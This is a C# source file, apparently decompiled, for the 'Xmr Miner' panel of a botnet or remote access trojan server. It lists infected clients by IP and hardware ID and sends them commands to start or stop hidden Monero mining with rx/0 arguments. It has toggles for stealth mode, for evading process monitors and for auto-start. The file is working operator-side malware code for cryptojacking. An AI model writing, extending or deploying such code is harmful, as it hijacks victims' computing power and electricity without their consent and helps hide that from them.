using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Globalization;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Forms;
using CustomControls.RJControls;
using MaterialSkin;
using MaterialSkin.Controls;
using Newtonsoft.Json;
using Server.Connectings;
using Server.Data;
using Server.Helper;

namespace Server.Forms;

public class FormXmrMiner : FormMaterial
{
	public bool work;

	public List<float> hashrateHistory;

	private IContainer components;

	private Panel panel1;

	private Panel panelChart;

	public Label labelHashrate;

	public MaterialSwitch materialSwitch2;

	private RJButton rjButton1;

	public MaterialSwitch materialSwitch1;

	public MaterialSwitch materialSwitch7;

	public DataGridView GridClients;

	private DataGridViewTextBoxColumn ColumnIP;

	private DataGridViewTextBoxColumn ColumnHwid;

	private DataGridViewTextBoxColumn ColumnStatus;

	private DataGridViewTextBoxColumn ColumnHashrate;

	private DataGridViewTextBoxColumn ColumnCpu;

	private DataGridViewTextBoxColumn ColumnGpu;

	private Timer timer1;

	public RJTextBox rjTextBox2;

	public MaterialSwitch materialSwitch3;

	public RJTextBox rjTextBox3;

	public MaterialSwitch materialSwitch4;

	public FormXmrMiner()
	{
		InitializeComponent();
		base.FormClosing += Closing1;
		hashrateHistory = new List<float>();
	}

	private void panelChart_Paint(object sender, PaintEventArgs e)
	{
		try
		{
			Graphics g = e.Graphics;
			g.SmoothingMode = SmoothingMode.AntiAlias;
			float num = panelChart.Width;
			float h = panelChart.Height;
			float marginLeft = 60f;
			float marginRight = 20f;
			float marginTop = 20f;
			float marginBottom = 50f;
			float chartWidth = num - marginLeft - marginRight;
			float chartHeight = h - marginTop - marginBottom;
			g.Clear(Color.White);
			float minHashrate = 0f;
			float maxHashrate = 0f;
			foreach (float h_val in hashrateHistory)
			{
				if (h_val > maxHashrate)
				{
					maxHashrate = h_val;
				}
			}
			if (maxHashrate == 0f)
			{
				maxHashrate = 100f;
			}
			maxHashrate *= 1.1f;
			int gridLines = 5;
			Color gridColor = Color.FromArgb(220, 220, 220);
			Color axisColor = Color.FromArgb(100, 100, 100);
			for (int i = 0; i <= gridLines; i++)
			{
				float y = marginTop + chartHeight * (float)i / (float)gridLines;
				using (Pen gridPen = new Pen(gridColor, 1f))
				{
					g.DrawLine(gridPen, marginLeft, y, marginLeft + chartWidth, y);
				}
				string label = FormatHashrateShort(maxHashrate - maxHashrate * (float)i / (float)gridLines);
				using Font labelFont = new Font("Consolas", 8f);
				using Brush labelBrush = new SolidBrush(Color.Gray);
				SizeF labelSize = g.MeasureString(label, labelFont);
				g.DrawString(label, labelFont, labelBrush, marginLeft - labelSize.Width - 5f, y - labelSize.Height / 2f);
			}
			int verticalLines = 6;
			for (int j = 0; j <= verticalLines; j++)
			{
				float x = marginLeft + chartWidth * (float)j / (float)verticalLines;
				using Pen gridPen2 = new Pen(gridColor, 1f);
				g.DrawLine(gridPen2, x, marginTop, x, marginTop + chartHeight);
			}
			using (Pen axisPen = new Pen(axisColor, 2f))
			{
				g.DrawLine(axisPen, marginLeft, marginTop, marginLeft, marginTop + chartHeight);
				g.DrawLine(axisPen, marginLeft, marginTop + chartHeight, marginLeft + chartWidth, marginTop + chartHeight);
			}
			if (hashrateHistory.Count < 2)
			{
				return;
			}
			PointF[] points = new PointF[hashrateHistory.Count];
			for (int k = 0; k < hashrateHistory.Count; k++)
			{
				float normalizedHashrate = (hashrateHistory[k] - minHashrate) / (maxHashrate - minHashrate);
				float x2 = marginLeft + chartWidth * (float)k / (float)(hashrateHistory.Count - 1);
				float y2 = marginTop + chartHeight - normalizedHashrate * chartHeight;
				points[k] = new PointF(x2, y2);
			}
			PointF[] fillPoints = new PointF[points.Length + 2];
			Array.Copy(points, fillPoints, points.Length);
			fillPoints[points.Length] = new PointF(points[points.Length - 1].X, marginTop + chartHeight);
			fillPoints[points.Length + 1] = new PointF(points[0].X, marginTop + chartHeight);
			using (GraphicsPath path = new GraphicsPath())
			{
				path.AddPolygon(fillPoints);
				using LinearGradientBrush brush = new LinearGradientBrush(new RectangleF(marginLeft, marginTop, chartWidth, chartHeight), Color.FromArgb(100, FormMaterial.PrimaryColor.R, FormMaterial.PrimaryColor.G, FormMaterial.PrimaryColor.B), Color.FromArgb(20, FormMaterial.PrimaryColor.R, FormMaterial.PrimaryColor.G, FormMaterial.PrimaryColor.B), LinearGradientMode.Vertical);
				g.FillPath(brush, path);
			}
			using (Pen linePen = new Pen(FormMaterial.PrimaryColor, 2.5f))
			{
				g.DrawLines(linePen, points);
			}
			using Brush pointBrush = new SolidBrush(FormMaterial.PrimaryColor);
			for (int l = 0; l < points.Length; l += Math.Max(1, points.Length / 20))
			{
				g.FillEllipse(pointBrush, points[l].X - 3f, points[l].Y - 3f, 6f, 6f);
			}
		}
		catch
		{
		}
	}

	private static string FormatHashrateShort(float hashrate)
	{
		if (hashrate >= 1E+09f)
		{
			return $"{hashrate / 1E+09f:F1}G";
		}
		if (hashrate >= 1000000f)
		{
			return $"{hashrate / 1000000f:F1}M";
		}
		if (hashrate >= 1000f)
		{
			return $"{hashrate / 1000f:F1}K";
		}
		return $"{hashrate:F0}";
	}

	private void FormProcess_Load(object sender, EventArgs e)
	{
		MaterialSkinManager.Instance.ThemeChanged += ChangeScheme;
		ChangeScheme(this);
		timer1.Start();
		if (File.Exists("local\\Miner.json"))
		{
			MinerXMR minerXMR = JsonConvert.DeserializeObject<MinerXMR>(File.ReadAllText("local\\Miner.json"));
			materialSwitch1.Checked = minerXMR.AntiProcess;
			materialSwitch3.Checked = minerXMR.Stealth;
			materialSwitch4.Checked = minerXMR.Gpu;
			rjTextBox3.Texts = minerXMR.ArgsStealh;
			rjTextBox2.Texts = minerXMR.Args;
			if (minerXMR.AutoStart)
			{
				materialSwitch2.Checked = true;
				work = true;
				materialSwitch7.Checked = true;
			}
		}
	}

	private void ChangeScheme(object sender)
	{
		Color primary = FormMaterial.PrimaryColor;
		bool isDark = MaterialSkinManager.Instance.Theme == MaterialSkinManager.Themes.DARK;
		Color back = (isDark ? Color.FromArgb(40, 40, 40) : SystemColors.Control);
		Color text = (isDark ? Color.WhiteSmoke : SystemColors.ControlText);
		rjTextBox2.BorderColor = primary;
		rjTextBox3.BorderColor = primary;
		rjTextBox2.BackColor = back;
		rjTextBox3.BackColor = back;
		rjTextBox2.ForeColor = text;
		rjTextBox3.ForeColor = text;
		rjButton1.BackColor = primary;
		rjButton1.BackgroundColor = primary;
		rjButton1.ForeColor = Color.White;
		rjButton1.TextColor = Color.White;
		rjButton1.BorderColor = primary;
		GridClients.BackgroundColor = back;
		GridClients.ColumnHeadersDefaultCellStyle.BackColor = back;
		GridClients.ColumnHeadersDefaultCellStyle.SelectionBackColor = back;
		GridClients.ColumnHeadersDefaultCellStyle.SelectionForeColor = primary;
		GridClients.ColumnHeadersDefaultCellStyle.ForeColor = primary;
		GridClients.DefaultCellStyle.BackColor = (isDark ? Color.FromArgb(50, 50, 50) : Color.White);
		GridClients.DefaultCellStyle.SelectionBackColor = primary;
		GridClients.DefaultCellStyle.ForeColor = text;
	}

	public Clients[] ClientsAll()
	{
		List<Clients> list = new List<Clients>();
		foreach (DataGridViewRow dataGridViewRow in (IEnumerable)GridClients.Rows)
		{
			list.Add((Clients)dataGridViewRow.Tag);
		}
		return list.ToArray();
	}

	private void Closing1(object sender, FormClosingEventArgs e)
	{
		work = false;
		Clients[] array = ClientsAll();
		foreach (Clients client in array)
		{
			Task.Run(delegate
			{
				client.Disconnect();
			});
		}
		GridClients.Rows.Clear();
		Hide();
		Save();
		e.Cancel = true;
	}

	private void Save()
	{
		File.WriteAllText("local\\Miner.json", JsonConvert.SerializeObject(new MinerXMR
		{
			AntiProcess = materialSwitch1.Checked,
			Stealth = materialSwitch3.Checked,
			ArgsStealh = rjTextBox3.Texts,
			AutoStart = materialSwitch2.Checked,
			Gpu = materialSwitch4.Checked,
			Args = rjTextBox2.Texts
		}, Formatting.Indented));
	}

	public object[] Args()
	{
		if (!materialSwitch3.Checked)
		{
			return new object[4]
			{
				"Start",
				materialSwitch1.Checked,
				materialSwitch4.Checked,
				" --cinit-find-x -B --algo=\"rx/0\" " + rjTextBox2.Texts
			};
		}
		return new object[5]
		{
			"Start",
			materialSwitch1.Checked,
			materialSwitch4.Checked,
			" --cinit-find-x -B --algo=\"rx/0\" " + rjTextBox2.Texts,
			" --cinit-find-x -B --algo=\"rx/0\" " + rjTextBox3.Texts
		};
	}

	private void rjButton1_Click(object sender, EventArgs e)
	{
		Hide();
	}

	private void materialSwitch7_CheckedChanged(object sender, EventArgs e)
	{
		if (materialSwitch7.Checked)
		{
			if (string.IsNullOrEmpty(rjTextBox2.Texts))
			{
				return;
			}
			Clients[] array = ClientsAll();
			for (int i = 0; i < array.Length; i++)
			{
				array[i].Send(Args());
			}
		}
		else
		{
			Clients[] array2 = ClientsAll();
			for (int j = 0; j < array2.Length; j++)
			{
				array2[j].Send(new object[1] { "Stop" });
			}
		}
		Save();
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		Text = $"Xmr Miner           Online [{GridClients.Rows.Count}]";
		float totalHashrate = 0f;
		foreach (DataGridViewRow row in (IEnumerable)GridClients.Rows)
		{
			try
			{
				if (row.Cells[3].Value != null && float.TryParse(row.Cells[3].Value.ToString().Replace(" H/s", "").Replace(" Kh/s", "")
					.Replace(" MH/s", "")
					.Trim()
					.Replace(',', '.'), NumberStyles.Float, CultureInfo.InvariantCulture, out var h))
				{
					if (row.Cells[3].Value.ToString().Contains("Kh/s"))
					{
						h *= 1000f;
					}
					else if (row.Cells[3].Value.ToString().Contains("MH/s"))
					{
						h *= 1000000f;
					}
					totalHashrate += h;
				}
			}
			catch
			{
			}
		}
		if (totalHashrate > 0f || hashrateHistory.Count > 0)
		{
			hashrateHistory.Add(totalHashrate);
			if (hashrateHistory.Count > 100)
			{
				hashrateHistory.RemoveAt(0);
			}
			panelChart.Invalidate();
		}
		labelHashrate.Text = FormatHashrate(totalHashrate);
	}

	private static string FormatHashrate(float hashrate)
	{
		if (hashrate >= 1000000f)
		{
			return $"Hashrate: {hashrate / 1000000f:F2} MH/s";
		}
		if (hashrate >= 1000f)
		{
			return $"Hashrate: {hashrate / 1000f:F2} Kh/s";
		}
		return $"Hashrate: {hashrate:F2} H/s";
	}

	private void materialSwitch2_CheckedChanged(object sender, EventArgs e)
	{
		Save();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle1 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new System.Windows.Forms.DataGridViewCellStyle();
		this.panel1 = new System.Windows.Forms.Panel();
		this.materialSwitch4 = new MaterialSkin.Controls.MaterialSwitch();
		this.rjTextBox3 = new CustomControls.RJControls.RJTextBox();
		this.materialSwitch3 = new MaterialSkin.Controls.MaterialSwitch();
		this.rjTextBox2 = new CustomControls.RJControls.RJTextBox();
		this.materialSwitch2 = new MaterialSkin.Controls.MaterialSwitch();
		this.rjButton1 = new CustomControls.RJControls.RJButton();
		this.materialSwitch1 = new MaterialSkin.Controls.MaterialSwitch();
		this.materialSwitch7 = new MaterialSkin.Controls.MaterialSwitch();
		this.GridClients = new System.Windows.Forms.DataGridView();
		this.ColumnIP = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ColumnHwid = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ColumnStatus = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ColumnHashrate = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ColumnCpu = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ColumnGpu = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.panelChart = new System.Windows.Forms.Panel();
		this.labelHashrate = new System.Windows.Forms.Label();
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		this.panel1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.GridClients).BeginInit();
		this.panelChart.SuspendLayout();
		base.SuspendLayout();
		this.panel1.BackColor = System.Drawing.Color.White;
		this.panel1.Controls.Add(this.materialSwitch4);
		this.panel1.Controls.Add(this.rjTextBox3);
		this.panel1.Controls.Add(this.materialSwitch3);
		this.panel1.Controls.Add(this.rjTextBox2);
		this.panel1.Controls.Add(this.materialSwitch2);
		this.panel1.Controls.Add(this.rjButton1);
		this.panel1.Controls.Add(this.materialSwitch1);
		this.panel1.Controls.Add(this.materialSwitch7);
		this.panel1.Dock = System.Windows.Forms.DockStyle.Top;
		this.panel1.Location = new System.Drawing.Point(3, 64);
		this.panel1.Name = "panel1";
		this.panel1.Size = new System.Drawing.Size(971, 128);
		this.panel1.TabIndex = 12;
		this.materialSwitch4.AutoSize = true;
		this.materialSwitch4.Depth = 0;
		this.materialSwitch4.Location = new System.Drawing.Point(526, 9);
		this.materialSwitch4.Margin = new System.Windows.Forms.Padding(0);
		this.materialSwitch4.MouseLocation = new System.Drawing.Point(-1, -1);
		this.materialSwitch4.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialSwitch4.Name = "materialSwitch4";
		this.materialSwitch4.Ripple = true;
		this.materialSwitch4.Size = new System.Drawing.Size(87, 37);
		this.materialSwitch4.TabIndex = 12;
		this.materialSwitch4.Text = "Gpu";
		this.materialSwitch4.UseVisualStyleBackColor = true;
		this.rjTextBox3.BackColor = System.Drawing.Color.White;
		this.rjTextBox3.BorderColor = System.Drawing.Color.MediumSlateBlue;
		this.rjTextBox3.BorderFocusColor = System.Drawing.Color.Yellow;
		this.rjTextBox3.BorderRadius = 0;
		this.rjTextBox3.BorderSize = 1;
		this.rjTextBox3.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBox3.ForeColor = System.Drawing.Color.MediumSlateBlue;
		this.rjTextBox3.Location = new System.Drawing.Point(15, 86);
		this.rjTextBox3.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBox3.Multiline = false;
		this.rjTextBox3.Name = "rjTextBox3";
		this.rjTextBox3.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBox3.PasswordChar = false;
		this.rjTextBox3.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBox3.PlaceholderText = "Args Stealh";
		this.rjTextBox3.Size = new System.Drawing.Size(788, 30);
		this.rjTextBox3.TabIndex = 11;
		this.rjTextBox3.Texts = "";
		this.rjTextBox3.UnderlinedStyle = false;
		this.materialSwitch3.AutoSize = true;
		this.materialSwitch3.Depth = 0;
		this.materialSwitch3.Location = new System.Drawing.Point(394, 9);
		this.materialSwitch3.Margin = new System.Windows.Forms.Padding(0);
		this.materialSwitch3.MouseLocation = new System.Drawing.Point(-1, -1);
		this.materialSwitch3.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialSwitch3.Name = "materialSwitch3";
		this.materialSwitch3.Ripple = true;
		this.materialSwitch3.Size = new System.Drawing.Size(108, 37);
		this.materialSwitch3.TabIndex = 10;
		this.materialSwitch3.Text = "Stealth";
		this.materialSwitch3.UseVisualStyleBackColor = true;
		this.rjTextBox2.BackColor = System.Drawing.Color.White;
		this.rjTextBox2.BorderColor = System.Drawing.Color.MediumSlateBlue;
		this.rjTextBox2.BorderFocusColor = System.Drawing.Color.Yellow;
		this.rjTextBox2.BorderRadius = 0;
		this.rjTextBox2.BorderSize = 1;
		this.rjTextBox2.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.rjTextBox2.ForeColor = System.Drawing.Color.MediumSlateBlue;
		this.rjTextBox2.Location = new System.Drawing.Point(15, 50);
		this.rjTextBox2.Margin = new System.Windows.Forms.Padding(4);
		this.rjTextBox2.Multiline = false;
		this.rjTextBox2.Name = "rjTextBox2";
		this.rjTextBox2.Padding = new System.Windows.Forms.Padding(10, 7, 10, 7);
		this.rjTextBox2.PasswordChar = false;
		this.rjTextBox2.PlaceholderColor = System.Drawing.Color.DarkGray;
		this.rjTextBox2.PlaceholderText = "Args add";
		this.rjTextBox2.Size = new System.Drawing.Size(788, 30);
		this.rjTextBox2.TabIndex = 9;
		this.rjTextBox2.Texts = "";
		this.rjTextBox2.UnderlinedStyle = false;
		this.materialSwitch2.AutoSize = true;
		this.materialSwitch2.Depth = 0;
		this.materialSwitch2.Location = new System.Drawing.Point(628, 9);
		this.materialSwitch2.Margin = new System.Windows.Forms.Padding(0);
		this.materialSwitch2.MouseLocation = new System.Drawing.Point(-1, -1);
		this.materialSwitch2.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialSwitch2.Name = "materialSwitch2";
		this.materialSwitch2.Ripple = true;
		this.materialSwitch2.Size = new System.Drawing.Size(129, 37);
		this.materialSwitch2.TabIndex = 8;
		this.materialSwitch2.Text = "Auto Start";
		this.materialSwitch2.UseVisualStyleBackColor = true;
		this.materialSwitch2.CheckedChanged += new System.EventHandler(materialSwitch2_CheckedChanged);
		this.rjButton1.BackColor = System.Drawing.Color.White;
		this.rjButton1.BackgroundColor = System.Drawing.Color.White;
		this.rjButton1.BorderColor = System.Drawing.Color.MediumSlateBlue;
		this.rjButton1.BorderRadius = 0;
		this.rjButton1.BorderSize = 1;
		this.rjButton1.FlatAppearance.BorderSize = 0;
		this.rjButton1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton1.ForeColor = System.Drawing.Color.MediumSlateBlue;
		this.rjButton1.Location = new System.Drawing.Point(15, 12);
		this.rjButton1.Name = "rjButton1";
		this.rjButton1.Size = new System.Drawing.Size(92, 28);
		this.rjButton1.TabIndex = 7;
		this.rjButton1.Text = "Hide";
		this.rjButton1.TextColor = System.Drawing.Color.MediumSlateBlue;
		this.rjButton1.UseVisualStyleBackColor = false;
		this.rjButton1.Click += new System.EventHandler(rjButton1_Click);
		this.materialSwitch1.AutoSize = true;
		this.materialSwitch1.Depth = 0;
		this.materialSwitch1.Location = new System.Drawing.Point(236, 9);
		this.materialSwitch1.Margin = new System.Windows.Forms.Padding(0);
		this.materialSwitch1.MouseLocation = new System.Drawing.Point(-1, -1);
		this.materialSwitch1.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialSwitch1.Name = "materialSwitch1";
		this.materialSwitch1.Ripple = true;
		this.materialSwitch1.Size = new System.Drawing.Size(146, 37);
		this.materialSwitch1.TabIndex = 6;
		this.materialSwitch1.Text = "Anti Process";
		this.materialSwitch1.UseVisualStyleBackColor = true;
		this.materialSwitch7.AutoSize = true;
		this.materialSwitch7.Depth = 0;
		this.materialSwitch7.Location = new System.Drawing.Point(132, 9);
		this.materialSwitch7.Margin = new System.Windows.Forms.Padding(0);
		this.materialSwitch7.MouseLocation = new System.Drawing.Point(-1, -1);
		this.materialSwitch7.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialSwitch7.Name = "materialSwitch7";
		this.materialSwitch7.Ripple = true;
		this.materialSwitch7.Size = new System.Drawing.Size(92, 37);
		this.materialSwitch7.TabIndex = 4;
		this.materialSwitch7.Text = "Start";
		this.materialSwitch7.UseVisualStyleBackColor = true;
		this.materialSwitch7.CheckedChanged += new System.EventHandler(materialSwitch7_CheckedChanged);
		this.GridClients.AllowUserToAddRows = false;
		this.GridClients.AllowUserToDeleteRows = false;
		this.GridClients.AllowUserToResizeColumns = false;
		this.GridClients.AllowUserToResizeRows = false;
		this.GridClients.BackgroundColor = System.Drawing.Color.White;
		this.GridClients.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.GridClients.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.GridClients.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle1.Alignment = System.Windows.Forms.DataGridViewContentAlignment.TopLeft;
		dataGridViewCellStyle1.BackColor = System.Drawing.Color.White;
		dataGridViewCellStyle1.Font = new System.Drawing.Font("Arial", 9f);
		dataGridViewCellStyle1.ForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle1.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle1.SelectionForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle1.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.GridClients.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle1;
		this.GridClients.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.GridClients.Columns.AddRange(this.ColumnIP, this.ColumnHwid, this.ColumnStatus, this.ColumnHashrate, this.ColumnCpu, this.ColumnGpu);
		this.GridClients.Cursor = System.Windows.Forms.Cursors.Default;
		dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle2.BackColor = System.Drawing.Color.White;
		dataGridViewCellStyle2.Font = new System.Drawing.Font("Arial", 9f);
		dataGridViewCellStyle2.ForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle2.SelectionBackColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle2.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.GridClients.DefaultCellStyle = dataGridViewCellStyle2;
		this.GridClients.Dock = System.Windows.Forms.DockStyle.Fill;
		this.GridClients.EnableHeadersVisualStyles = false;
		this.GridClients.GridColor = System.Drawing.Color.FromArgb(17, 17, 17);
		this.GridClients.Location = new System.Drawing.Point(3, 397);
		this.GridClients.Name = "GridClients";
		this.GridClients.ReadOnly = true;
		this.GridClients.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle3.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle3.BackColor = System.Drawing.Color.FromArgb(17, 17, 17);
		dataGridViewCellStyle3.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		dataGridViewCellStyle3.ForeColor = System.Drawing.Color.FromArgb(0, 192, 0);
		dataGridViewCellStyle3.Padding = new System.Windows.Forms.Padding(1, 0, 0, 0);
		dataGridViewCellStyle3.SelectionBackColor = System.Drawing.Color.FromArgb(0, 192, 0);
		dataGridViewCellStyle3.SelectionForeColor = System.Drawing.Color.FromArgb(17, 17, 17);
		dataGridViewCellStyle3.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.GridClients.RowHeadersDefaultCellStyle = dataGridViewCellStyle3;
		this.GridClients.RowHeadersVisible = false;
		this.GridClients.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.GridClients.ShowCellErrors = false;
		this.GridClients.ShowCellToolTips = false;
		this.GridClients.ShowEditingIcon = false;
		this.GridClients.ShowRowErrors = false;
		this.GridClients.Size = new System.Drawing.Size(971, 187);
		this.GridClients.TabIndex = 11;
		this.ColumnIP.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.None;
		this.ColumnIP.HeaderText = "IP";
		this.ColumnIP.MinimumWidth = 120;
		this.ColumnIP.Name = "ColumnIP";
		this.ColumnIP.ReadOnly = true;
		this.ColumnIP.Width = 120;
		this.ColumnHwid.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.None;
		this.ColumnHwid.HeaderText = "Hwid";
		this.ColumnHwid.MinimumWidth = 200;
		this.ColumnHwid.Name = "ColumnHwid";
		this.ColumnHwid.ReadOnly = true;
		this.ColumnHwid.Width = 200;
		this.ColumnStatus.HeaderText = "Status";
		this.ColumnStatus.MinimumWidth = 100;
		this.ColumnStatus.Name = "ColumnStatus";
		this.ColumnStatus.ReadOnly = true;
		this.ColumnHashrate.HeaderText = "Hashrate";
		this.ColumnHashrate.MinimumWidth = 80;
		this.ColumnHashrate.Name = "ColumnHashrate";
		this.ColumnHashrate.ReadOnly = true;
		this.ColumnHashrate.Width = 80;
		this.ColumnCpu.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.ColumnCpu.HeaderText = "Cpu";
		this.ColumnCpu.MinimumWidth = 100;
		this.ColumnCpu.Name = "ColumnCpu";
		this.ColumnCpu.ReadOnly = true;
		this.ColumnGpu.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
		this.ColumnGpu.HeaderText = "Gpu";
		this.ColumnGpu.Name = "ColumnGpu";
		this.ColumnGpu.ReadOnly = true;
		this.panelChart.BackColor = System.Drawing.Color.White;
		this.panelChart.Controls.Add(this.labelHashrate);
		this.panelChart.Dock = System.Windows.Forms.DockStyle.Top;
		this.panelChart.Location = new System.Drawing.Point(3, 192);
		this.panelChart.Name = "panelChart";
		this.panelChart.Size = new System.Drawing.Size(971, 205);
		this.panelChart.TabIndex = 13;
		this.panelChart.Paint += new System.Windows.Forms.PaintEventHandler(panelChart_Paint);
		this.labelHashrate.AutoSize = true;
		this.labelHashrate.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.labelHashrate.Location = new System.Drawing.Point(12, 180);
		this.labelHashrate.Name = "labelHashrate";
		this.labelHashrate.Size = new System.Drawing.Size(93, 15);
		this.labelHashrate.TabIndex = 0;
		this.labelHashrate.Text = "Hashrate: 0 Kh/s";
		this.timer1.Interval = 1000;
		this.timer1.Tick += new System.EventHandler(timer1_Tick);
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.White;
		base.ClientSize = new System.Drawing.Size(977, 587);
		base.Controls.Add(this.GridClients);
		base.Controls.Add(this.panelChart);
		base.Controls.Add(this.panel1);
		base.Name = "FormXmrMiner";
		this.Text = "Xmr Miner           Online [0]";
		base.Load += new System.EventHandler(FormProcess_Load);
		this.panel1.ResumeLayout(false);
		this.panel1.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.GridClients).EndInit();
		this.panelChart.ResumeLayout(false);
		this.panelChart.PerformLayout();
		base.ResumeLayout(false);
	}
}
